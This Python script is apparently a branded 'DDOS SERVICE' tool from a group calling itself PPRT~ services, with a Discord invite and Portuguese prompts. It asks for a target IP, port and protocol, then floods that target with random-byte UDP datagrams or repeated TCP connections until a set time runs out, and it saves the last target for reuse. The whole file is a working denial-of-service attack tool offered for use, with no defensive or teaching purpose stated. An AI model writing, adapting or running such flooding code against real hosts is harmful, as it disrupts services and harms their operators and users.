import signal
import time
import socket
import random
import threading
import sys
import os

ascii_art = """
 -----------------------------------------------------------------------------------
 ---------------ooooooooo.   ooooooooo.   ooooooooo.   ooooooooooooo----------------
 ---------------`888   `Y88. `888   `Y88. `888   `Y88. 8'   888   `8----------------
 --------------- 888   .d88'  888   .d88'  888   .d88'      888     ----------------
 --------------- 888ooo88P'   888ooo88P'   888ooo88P'       888     ----------------
 --------------- 888          888          888`88b.         888     ----------------
 --------------- 888          888          888  `88b.       888     ----------------
 ---------------o888o        o888o        o888o  o888o     o888o    ----------------
 ----------------------------------DDOS SERVICE-------------------------------------
 -----------------------------------------------------------------------------------
"""
print(ascii_art)

print("\033[1;33;40m MAKE BY [PPRT~] | discord.gg/pprtservices\n")

input("Press Enter to start...")
def save_last_command(ip, port, choice, times, threads):
    with open("last_command.txt", "w") as file:
        file.write(f"{ip}\n{port}\n{choice}\n{times}\n{threads}")

def load_last_command():
    try:
        with open("last_command.txt", "r") as file:
            lines = file.readlines()
            ip = lines[0].strip()
            port = int(lines[1].strip())
            choice = lines[2].strip()
            times = int(lines[3].strip())
            threads = int(lines[4].strip())
            return ip, port, choice, times, threads
    except FileNotFoundError:
        return None

last_command = load_last_command()

if last_command:
    ip, port, choice, times, threads = last_command
    print(f"Último comando executado: ip={ip}, port={port}, choice={choice}, times={times}, threads={threads}")
    use_last_command = input("Deseja usar o último comando? (y/n): ")
    if use_last_command.lower() == "n":
        ip = str(input(" Host/Ip:"))
        port = int(input(" Porta:"))
        choice = str(input(" UDP(y/n):"))
        times = int(input(" Pacotes em uma conexão:"))
        threads = int(input(" Threads:"))
    save_last_command(ip, port, choice, times, threads)
else:
    ip = str(input(" Host/Ip:"))
    port = int(input(" Porta:"))
    choice = str(input(" UDP(y/n):"))
    times = int(input(" Pacotes em uma conexão:"))
    threads = int(input(" Threads:"))
    save_last_command(ip, port, choice, times, threads)

timeout_seconds = int(input(" Tempo limite de execução (em segundos):"))

def run_udp():
    data = random._urandom(1024)
    i = random.choice(("[*]", "[!]", "[#]"))
    start_time = time.time()
    while time.time() - start_time < timeout_seconds:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for x in range(times):
                s.sendto(data, addr)
            print(i + " ENVIANDO PACOTES UDP POR [PPRT~ SERVICES]!!!")
        except Exception as e:
            print("[!] Error:", str(e))
        finally:
            s.close()

def run_tcp():
    data = random._urandom(16)
    i = random.choice(("[*]", "[!]", "[#]"))
    start_time = time.time()
    while time.time() - start_time < timeout_seconds:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i + " ENVIANDO PACOTES TCP POR [PPRT~ SERVICES]!!!")
        except Exception as e:
            print("[*] Error:", str(e))
        finally:
            s.close()

def run():
    if choice.lower() == 'y':
        run_udp()
    else:
        run_tcp()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def byebye():
    clear()
    os.system("figlet Youre Leaving Sir -f slant")
    sys.exit(130)

def exit_gracefully(signum, frame):
    # restore the original signal handler
    signal.signal(signal.SIGINT, original_sigint)

    try:
        exitc = str(input(" Você quer sair <3 ?:"))
        if exitc.lower() == 'y':
            byebye()

    except KeyboardInterrupt:
        print("Ok ok")
        byebye()

    # restore the gracefully exit handler
    signal.signal(signal.SIGINT, exit_gracefully)

if __name__ == '__main__':
    # store SIGINT handler
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)

    run()
